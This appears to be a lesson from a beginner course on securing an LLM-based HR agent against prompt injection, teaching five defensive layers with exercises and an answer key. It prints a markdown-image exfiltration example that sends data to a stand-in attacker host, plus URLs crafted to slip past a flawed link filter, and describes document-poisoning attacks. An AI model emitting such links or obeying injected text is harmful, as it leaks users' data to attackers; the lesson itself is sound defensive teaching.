# Day 14: Defence in depth

**Level 4 · Security** · about 2 hours · beginner Python

> Here's the honest truth: **there is no prompt that makes a model immune to injection.** Anyone selling you "the unbreakable system prompt" is wrong.
>
> Real defence works like airport security. The ID check, the bag scanner, the metal detector and the staff watching the queue are each imperfect. Together they make an attack hard, noisy and not worth the effort.
>
> Today you take the agent you broke yesterday and give it layers.

## Today's goal

Apply five layers of defence to your HR agent, understand what each one stops, and find the weaknesses that remain.

## Learn

| Layer | What it means | What it stops |
|---|---|---|
| **1. Least privilege** | Give each tool the smallest power it needs | Yesterday's leave-balance leak. The tool simply can't look up other people. |
| **2. Mark untrusted content** | Wrap outside content in clear tags; tell the model it's data, never instructions | Many (not all) injections |
| **3. Hard limits and human approval** | Rules in *code*, plus a human "yes" before anything irreversible | Email to attackers, even if the model is fooled |
| **4. Output checks** | Inspect what the AI produces before showing or using it | Data smuggled out in links and images |
| **5. Logging and monitoring** | Record every tool call; review and alert | Attacks you didn't prevent, so you can spot and respond |

**Key ideas**

- **Layers 1 and 3 are in code, and they are the strongest.** A model can be persuaded; an `if` statement can't. When a rule really matters, enforce it outside the model.
- **Layer 2 helps but is not a wall.** It reduces the success rate, but the model is still reading attacker text.
- **Data exfiltration through images:**
  - The attacker gets the AI to write `![](https://evil.example/?data=SECRET)`.
  - When the chat app displays the image, the *user's browser* requests that URL.
  - The request delivers the data to the attacker, with no click needed.
  - This is why layer 4 strips external links.
- **Guardrail models** are separate classifiers that scan inputs or outputs for injection attempts. Big products use them as an extra layer. They're useful, but also imperfect.
- **Match the defence to the damage.** A chatbot that can only talk needs less than an agent that can move money.

## To-do

- [ ] Read the Learn section
- [ ] Read [`code/day14_agent_hardened.py`](../code/day14_agent_hardened.py) and find all five `LAYER` comments
- [ ] Re-run yesterday's attacks against the hardened agent (exercise 1)
- [ ] Find the bug in layer 4 (exercise 2)
- [ ] Do exercises 3 and 4
- [ ] Journal

## Exercises

**1. Replay the attacks.** From `code/`:

```bash
INBOX_FILE=inbox_poisoned.json python day14_agent_hardened.py
```

Ask "Summarise my inbox." Then try every successful attack from your findings log. For each one, write down:
- **Blocked by which layer?**
- or **still works?**

Check `audit.log` afterwards and see what an investigator would see.

**2. Find the bug in layer 4.** `clean_output()` keeps any URL that *contains* `mawingu.example`. Think like an attacker: how could you write a URL to an outside site that still passes this check?

<details>
<summary>Hint</summary>

What about `https://evil.example/steal?x=mawingu.example`? Or `https://mawingu.example.evil.example/`?

</details>

Fix it so only URLs whose **hostname** is exactly `mawingu.example`, or ends in `.mawingu.example`, are kept. Python's `urllib.parse.urlparse(url).hostname` will help. Then test your fix with both hint URLs.

**3. Measure the difference.** Run the "Summarise my inbox" attack 5 times against the Day 11 agent and 5 times against the Day 14 agent. Record how often each one:
- looked up other employees
- tried to email outside the company
- warned you about the suspicious email

**4. Defend AskTheManual.** Your Day 13 manual-poisoning attack made the bot pass on a fake policy. Which layers apply to a bot with no tools? Add at least two defences, for example:
- tell the model to flag instructions found inside documents
- only allow trusted people to edit the source documents
- check answers for email addresses or links that don't belong to the company

## Stretch

Add a sixth layer: before running any `send_email`, make a *separate* AI call that asks "Did the user clearly request this email in their own words? Answer YES or NO." Only continue on YES. What are the pros and cons of using an AI to guard an AI?

## Check yourself

1. Why are rules in code stronger than rules in the prompt?
2. How can an image leak data without the user clicking anything?
3. Which layer would have stopped the leave-balance leak from Day 12?

<details>
<summary>Answers</summary>

1. A model can be persuaded by clever text; code does exactly what it says every time.
2. When the app displays the image, the browser automatically requests its URL, and data hidden in that URL goes to the attacker's server.
3. Layer 1, least privilege. The tool can now only look up the logged-in user.

</details>

## Journal

*For an AI tool I use or want to build: which of the five layers does it have, and which is missing?*
